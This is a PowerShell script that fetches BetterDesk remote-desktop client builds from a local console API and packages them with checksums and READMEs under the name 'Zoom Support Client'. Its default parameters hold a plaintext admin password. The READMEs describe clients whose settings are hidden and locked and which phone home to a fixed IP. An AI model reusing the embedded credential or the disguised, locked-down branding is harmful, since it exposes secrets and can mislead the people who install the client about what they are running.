param(
    [string]$BundleId = '37fac6a77bcc',
    [string]$User = 'admin',
    [string]$Pass = 'tKjsnYB8Mez2FRd1',
    [string]$Base = 'http://localhost:5000',
    [string]$OutRoot = 'C:\Users\milaz\BetterDesk\distribution\Zoom-Support-Clients'
)
$ErrorActionPreference = 'Stop'

# ---- login ----
$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$page = Invoke-WebRequest -Uri "$Base/login" -WebSession $sess -UseBasicParsing -TimeoutSec 20
$csrf = ''
if ($page.Content -match "csrfToken:\s*'([^']+)'") { $csrf = $Matches[1] }
$h = @{ 'X-CSRF-Token' = $csrf; 'Content-Type' = 'application/json' }
$null = Invoke-WebRequest -Uri "$Base/api/auth/login" -Method Post `
    -Body (@{username=$User; password=$Pass} | ConvertTo-Json -Compress) `
    -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 25

$b = (Invoke-WebRequest -Uri "$Base/api/generator/bundles/$BundleId" -WebSession $sess -Headers $h -UseBasicParsing).Content | ConvertFrom-Json
$bundle = $b.data.bundle
$builds = @($bundle.builds)
$ready = @($builds | Where-Object { $_.status -eq 'ready' -or $_.status -eq 'completed' -or ($_.artifact_path -and $_.artifact_size -gt 0) })
Write-Output ("bundle: " + $bundle.name + " (" + $bundle.slug + ") download=" + $bundle.download_url)
Write-Output ("builds: " + $builds.Count + " total, " + $ready.Count + " with artifacts")

if ($ready.Count -eq 0) { Write-Output 'No artifacts yet.'; exit 1 }

New-Item -ItemType Directory -Force -Path $OutRoot | Out-Null
$sums = New-Object System.Collections.Generic.List[string]

foreach ($x in $ready) {
    $plat = $x.platform; $arch = $x.arch
    $src = $x.artifact_path
    if (-not (Test-Path $src)) { Write-Output ("MISSING FILE: " + $src); continue }
    $dir = Join-Path $OutRoot ("{0}-{1}" -f $plat, $arch)
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    $name = Split-Path $src -Leaf
    $dst = Join-Path $dir $name
    Copy-Item $src $dst -Force
    $hash = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
    $match = if ($x.artifact_sha256) { $hash -eq $x.artifact_sha256.ToLower() } else { $null }
    Write-Output ("{0}/{1}: {2} ({3} bytes) sha256={4} verify={5}" -f $plat, $arch, $name, $x.artifact_size, $hash, $match)
    $sums.Add("{0}  {1}/{2}" -f $hash, ("{0}-{1}" -f $plat, $arch), $name)

    # per-platform README
    @"
Zoom Support Client - $plat/$arch
=================================
Install / run:
  Windows : extract the .zip, run BetterDesk.exe (allow through firewall when prompted)
  macOS   : extract the .tar.gz, run the binary (Right-click > Open the first time)
  Linux   : extract the .tar.gz, chmod +x the binary, run it

The client is INCOMING-ONLY and pre-configured for this deployment:
  Server (rendezvous/relay/API): 109.204.74.122:21114
  Settings are hidden and locked; the device appears in the web console / hub.
  Embedded server profile is signed at build time (Ed25519, per-deployment key).

Verify integrity: compare SHA-256 against ../SHA256SUMS.txt
"@ | Set-Content -Path (Join-Path $dir 'README.txt') -Encoding utf8
}

# root checksum manifest
($sums -join "`n") + "`n" | Set-Content -Path (Join-Path $OutRoot 'SHA256SUMS.txt') -Encoding ascii

# top-level distribution README
@"
Zoom Support Client - distribution package
==========================================
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm')
Console bundle: $BundleId (slug: $($bundle.slug))
Download hub:   $($bundle.download_url)
Build commit:   $($bundle.client_commit)

Folders contain one portable build per operating system / architecture.
Each client phones home to 109.204.74.122:21114 (incoming-only, settings locked).
Verify downloads with SHA256SUMS.txt.
"@ | Set-Content -Path (Join-Path $OutRoot 'README.txt') -Encoding utf8

Write-Output ("DONE -> " + $OutRoot)
